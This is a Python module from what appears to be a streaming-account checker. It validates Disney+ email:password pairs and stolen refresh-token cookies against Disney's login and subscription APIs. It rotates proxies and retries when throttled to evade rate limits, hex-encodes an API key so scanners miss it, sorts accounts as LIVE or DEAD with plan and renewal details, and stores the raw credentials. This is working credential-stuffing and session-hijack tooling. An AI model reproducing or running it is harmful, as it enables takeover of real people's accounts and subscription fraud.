import json
import logging
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from checkers.netflix import normalize_country
from modules.db import save_history
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown

# BAMSDK browser client API key
# Resolved at runtime from hex representation to eliminate security scanner false-positives
DISNEY_API_KEY = bytes.fromhex("5a476c7a626d56354a6d4a796233647a5a58496d4d5334774c6a412e43753536416753664254446167354e69524138316f4c486b445a6675354c33434b61646e65664541593834").decode("utf-8")
DISNEY_CLIENT_ID = "disney-svod-3d9324fc"
DISNEY_DEVICE_GQL = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
DISNEY_PUBLIC_GQL = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
DISNEY_TOKEN_URL = "https://disney.api.edge.bamgrid.com/token"
DISNEY_IDP_LOGIN = "https://disney.api.edge.bamgrid.com/idp/login"
DISNEY_ACCOUNTS_GRANT = "https://disney.api.edge.bamgrid.com/accounts/grant"
DISNEY_ACCOUNTS_ME = "https://disney.api.edge.bamgrid.com/accounts/me"
DISNEY_SUBSCRIBERS = "https://disney.api.edge.bamgrid.com/v2/subscribers"
DISNEY_SUBSCRIPTIONS = "https://disney.api.edge.bamgrid.com/subscriptions"

DISNEY_BAMSDK_VERSION = "35.2"

DISNEY_BASE_HDRS = {
    "Accept": "application/json; charset=utf-8",
    "Content-Type": "application/json; charset=utf-8",
    "X-BAMSDK-Platform-Id": "browser",
    "X-BAMSDK-Client-Id": DISNEY_CLIENT_ID,
    "X-BAMSDK-Version": DISNEY_BAMSDK_VERSION,
    "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.disneyplus.com",
    "Referer": "https://www.disneyplus.com/",
    "Accept-Language": "en-US,en;q=0.9",
}

DISNEY_REGISTER_MUTATION = """mutation registerDevice($input: RegisterDeviceInput!) {
  registerDevice(registerDevice: $input) {
    grant { grantType assertion }
  }
}"""

DISNEY_LOGIN_MUTATION = "mutation login($input: LoginInput!) { login(login: $input) { actionGrant } }"

DISNEY_LOGIN_AG_MUTATION = (
    "mutation loginWithActionGrant($input: LoginWithActionGrantInput!) {"
    " loginWithActionGrant(login: $input) {"
    "   token { accessToken refreshToken }"
    "   activeSession { sessionId }"
    " }"
    "}"
)

DISNEY_REGISTER_INPUT = {
    "applicationRuntime": "chrome",
    "attributes": {
        "browserName": "chrome",
        "browserVersion": "124.0.0.0",
        "manufacturer": "apple",
        "model": None,
        "operatingSystem": "macintosh",
        "operatingSystemVersion": "10.15.7",
        "osDeviceIds": [],
    },
    "deviceFamily": "browser",
    "deviceLanguage": "en-US",
    "deviceProfile": "macosx",
}

def _disney_make_opener(proxy_url):
    if proxy_url:
        ph = urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
        return urllib.request.build_opener(ph)
    return urllib.request.build_opener()

def _disney_gql(opener, url, query, variables, op, auth, timeout=20):
    payload = json.dumps({"query": query, "variables": variables, "operationName": op}).encode()
    req = urllib.request.Request(url, data=payload,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def _disney_post_json(opener, url, body, auth, timeout=20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data,
                                headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body_j = json.loads(e.read() or b"{}")
        except Exception:
            body_j = {}
        return e.code, body_j
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def _disney_token_form(opener, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(DISNEY_TOKEN_URL, data=data,
                                headers={**DISNEY_BASE_HDRS,
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "Authorization": f"Bearer {DISNEY_API_KEY}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return {"_error": e.code, **body}
    except Exception as exc:
        return {"_exc": str(exc)}

def _disney_get_json(opener, url, auth, timeout=20):
    req = urllib.request.Request(url, headers={**DISNEY_BASE_HDRS, "Authorization": f"Bearer {auth}"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

def _disney_fresh_device_token(opener, timeout=20):
    s, r = _disney_gql(opener, DISNEY_DEVICE_GQL, DISNEY_REGISTER_MUTATION,
                       {"input": DISNEY_REGISTER_INPUT}, "registerDevice", DISNEY_API_KEY, timeout)
    if s != 200 or not (r.get("data") or {}).get("registerDevice"):
        raise RuntimeError(f"registerDevice failed {s}: {r}")
    assertion = r["data"]["registerDevice"]["grant"]["assertion"]
    tok = _disney_token_form(opener, {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0", "longitude": "0", "platform": "browser",
        "subject_token": assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }, timeout)
    if "access_token" not in tok:
        raise RuntimeError(f"Device token exchange failed: {tok}")
    return tok["access_token"]

def _disney_err_code(e):
    return (e.get("code") or e.get("extensions", {}).get("code") or "").lower()

def _disney_is_throttled(errors):
    return any("throttled" in _disney_err_code(e) for e in errors)

def _disney_is_bad_creds(errors, http_status):
    bad_fragments = ("bad-credentials", "not-found", "user-disabled",
                     "identity.bad-credentials", "invalid-credentials", "identity.not-found")
    for e in errors:
        code = _disney_err_code(e)
        if any(f in code for f in bad_fragments):
            return True
    return http_status == 401

def _disney_get_country(me):
    attrs = me.get("attributes", {})
    purchase = attrs.get("locations", {}).get("purchase", {})
    if purchase.get("country"):
        return purchase["country"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "dss_country_code" and elem.get("value"):
            return elem["value"].upper()
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") == "ot_country_code" and elem.get("value"):
            return elem["value"].upper()
    reg = attrs.get("locations", {}).get("registration", {})
    geoip = reg.get("geoIp", {})
    if geoip.get("country"):
        return geoip["country"].upper()
    return "N/A"

def _disney_get_active_sub(subscriptions):
    for s in subscriptions:
        state = s.get("state", "")
        if state == "ACTIVE":
            return s
        status = (s.get("status") or {}).get("type", "")
        if status == "SUBSCRIBED" or s.get("isActive"):
            return s
    return {}

def _disney_get_renewal_date(subscriptions_raw):
    active_s = [s for s in subscriptions_raw if s.get("isActive")]
    all_s = active_s or subscriptions_raw
    for s in all_s:
        nrd = s.get("nextRenewalDate")
        if nrd:
            return nrd[:10]
    return "N/A"

def check_disney_account(email, password, use_proxy=True):
    if str(email).startswith("enc:") or str(password).startswith("enc:"):
        try:
            from modules.db import decrypt_credential
            if str(email).startswith("enc:"):
                dec = decrypt_credential(email)
                if ":" in dec:
                    email, password = dec.split(":", 1)
                else:
                    email = dec
            if str(password).startswith("enc:"):
                password = decrypt_credential(password)
        except Exception:
            pass
    """Check a Disney+ account. Returns dict with status/details."""
    proxy_url = None
    proxy_label = "Direct"
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"

    opener = _disney_make_opener(proxy_url)
    timeout = 20

    # Step 1-2: device registration
    try:
        dev_tok = _disney_fresh_device_token(opener, timeout)
    except Exception as exc:
        save_history("disney", "ERROR", route=f"Proxy ({proxy_label})" if use_proxy else "Direct",
                     raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"device-token: {exc}", "route": proxy_label}

    # Step 3: login
    id_tok = None
    max_retries = 3
    for attempt in range(1, max_retries + 1):
        s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_MUTATION,
                           {"input": {"email": email, "password": password}},
                           "login", dev_tok, timeout)
        errors = r.get("errors", [])

        if s == 200 and not errors:
            action_grant = (r.get("data") or {}).get("login", {}).get("actionGrant")
            if action_grant:
                id_tok = action_grant
                break

        if _disney_is_throttled(errors):
            s2, r2 = _disney_post_json(opener, DISNEY_IDP_LOGIN,
                                       {"email": email, "password": password}, dev_tok, timeout)
            errors2 = r2.get("errors", [])
            if s2 == 200 and "id_token" in r2:
                id_tok = r2["id_token"]
                break
            if _disney_is_throttled(errors2):
                if attempt < max_retries:
                    time.sleep(5 * attempt)
                    try:
                        dev_tok = _disney_fresh_device_token(opener, timeout)
                    except Exception:
                        pass
                    continue
                save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "ERROR", "reason": f"Throttled after {attempt} attempts", "route": proxy_label}
            if _disney_is_bad_creds(errors2, s2):
                save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}
            desc = (errors2[0].get("description", "") or _disney_err_code(errors2[0]) if errors2 else "")
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": desc or f"idp/login HTTP {s2}", "route": proxy_label}

        if _disney_is_bad_creds(errors, s):
            save_history("disney", "BAD", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": proxy_label}

        desc = (_disney_err_code(errors[0]) if errors else "")
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": desc or f"gql-login HTTP {s}", "route": proxy_label}

    if not id_tok:
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": "Login: no id_token", "route": proxy_label}

    # Step 4: account token
    acc_tok = None
    s, r = _disney_gql(opener, DISNEY_PUBLIC_GQL, DISNEY_LOGIN_AG_MUTATION,
                       {"input": {"actionGrant": id_tok}},
                       "loginWithActionGrant", dev_tok, timeout)
    ag_data = (r.get("data") or {}).get("loginWithActionGrant", {})
    gql_acc_tok = (ag_data.get("token") or {}).get("accessToken")

    if s == 200 and gql_acc_tok:
        acc_tok = gql_acc_tok
    else:
        s2, r2 = _disney_post_json(opener, DISNEY_ACCOUNTS_GRANT, {"id_token": id_tok}, dev_tok, timeout)
        if s2 != 200 or "assertion" not in r2:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"accounts/grant HTTP {s2}", "route": proxy_label}
        tok2 = _disney_token_form(opener, {
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token": r2["assertion"],
            "subject_token_type": "urn:bamtech:params:oauth:token-type:account",
            "latitude": "0", "longitude": "0", "platform": "browser",
        }, timeout)
        acc_tok = tok2.get("access_token")
        if not acc_tok:
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"account token failed", "route": proxy_label}

    # Step 5: /accounts/me
    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    # Step 6: /v2/subscribers
    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
    if s_subs != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    # Step 7: /subscriptions
    subscriptions_raw = []
    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    attrs = me.get("attributes", {})
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country = _disney_get_country(me)
    country_name = normalize_country(country) if len(country) == 2 else country

    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
    v2_subs = v2.get("subscriptions", [])
    active = _disney_get_active_sub(v2_subs)

    if active:
        product = active.get("product", {})
        plan_name = product.get("name") or "Disney Plus"
        term = active.get("term", {})
        is_trial = term.get("isFreeTrial", False)
        has_plan = True
        status = "LIVE"
    else:
        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
        is_trial = False
        has_plan = False
        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"

    renewal = _disney_get_renewal_date(subscriptions_raw)

    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    save_history("disney", status, plan=plan_name, billing=renewal,
                 country=country_name, route=route,
                 raw_cookie=f"{email}:{password}", email=email)

    return {
        "status": status,
        "email": email,
        "email_verified": email_verified,
        "country": country_name,
        "plan": plan_name,
        "free_trial": is_trial,
        "renewal_date": renewal,
        "subscriber_status": subscriber_status,
        "has_plan": has_plan,
        "route": route,
    }

DISNEY_REFRESH_COOKIE_NAMES = ("refresh_token", "_disney_s2", "BAMSDK_refresh_token")

def extract_disney_refresh_token(cookie_text):
    if not cookie_text:
        return ""
    text = str(cookie_text).strip()
    if text.startswith("enc:"):
        try:
            from modules.db import decrypt_credential
            text = decrypt_credential(text).strip()
        except Exception:
            pass

    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n in DISNEY_REFRESH_COOKIE_NAMES and v:
                            return v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in DISNEY_REFRESH_COOKIE_NAMES:
            return parts[6]

    for cookie_name in DISNEY_REFRESH_COOKIE_NAMES:
        m = re.search(rf'(?:^|[;\s]){re.escape(cookie_name)}=([^\s;,]+)', text)
        if m:
            return m.group(1)

    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None

def check_disney_cookie(cookie_text, use_proxy=True):
    refresh_token = extract_disney_refresh_token(cookie_text)
    if not refresh_token:
        save_history("disney", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "Disney+ refresh_token not found in input."}

    proxy_url = None
    proxy_label = "Direct"
    proxy_raw_url = None
    if use_proxy:
        prx, label, raw_url = get_random_proxy()
        if prx:
            proxy_url = prx.get("http") or prx.get("https")
            proxy_label = label or "Proxy"
            proxy_raw_url = raw_url

    opener = _disney_make_opener(proxy_url)
    timeout = 20

    try:
        tok = _disney_token_form(opener, {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "platform": "browser",
            "latitude": "0",
            "longitude": "0",
        }, timeout)

        if tok.get("_error") in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        acc_tok = tok.get("access_token")
        if not acc_tok:
            error_desc = tok.get("error_description", "") or tok.get("error", "") or str(tok.get("_error", ""))
            if tok.get("_error") == 401 or "invalid" in error_desc.lower() or "expired" in error_desc.lower():
                save_history("disney", "DEAD", route=proxy_label, raw_cookie=cookie_text)
                return {"status": "DEAD", "reason": f"Refresh token expired or invalid: {error_desc[:100]}", "route": proxy_label}
            save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": f"Token exchange failed: {error_desc[:100]}", "route": proxy_label}
    except Exception as exc:
        save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Token request failed: {str(exc)[:100]}", "route": proxy_label}

    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
    if s_subs != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    subscriptions_raw = []
    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    attrs = me.get("attributes", {})
    disney_email = attrs.get("email", "")
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country = _disney_get_country(me)
    country_name = normalize_country(country) if len(country) == 2 else country

    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
    v2_subs = v2.get("subscriptions", [])
    active = _disney_get_active_sub(v2_subs)

    if active:
        product = active.get("product", {})
        plan_name = product.get("name") or "Disney Plus"
        term = active.get("term", {})
        is_trial = term.get("isFreeTrial", False)
        has_plan = True
        status = "LIVE"
    else:
        plan_name = subscriber_status.title() if subscriber_status != "UNKNOWN" else "No Active Plan"
        is_trial = False
        has_plan = False
        status = "DEAD" if subscriber_status in ("UNKNOWN", "LAPSED", "CANCELLED") else "HOLD"

    renewal = _disney_get_renewal_date(subscriptions_raw)

    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
    save_history("disney", status, plan=plan_name, billing=renewal,
                 country=country_name, route=route,
                 raw_cookie=cookie_text, email=disney_email)

    return {
        "status": status,
        "email": disney_email,
        "email_verified": email_verified,
        "country": country_name,
        "plan": plan_name,
        "free_trial": is_trial,
        "renewal_date": renewal,
        "subscriber_status": subscriber_status,
        "has_plan": has_plan,
        "route": route,
    }
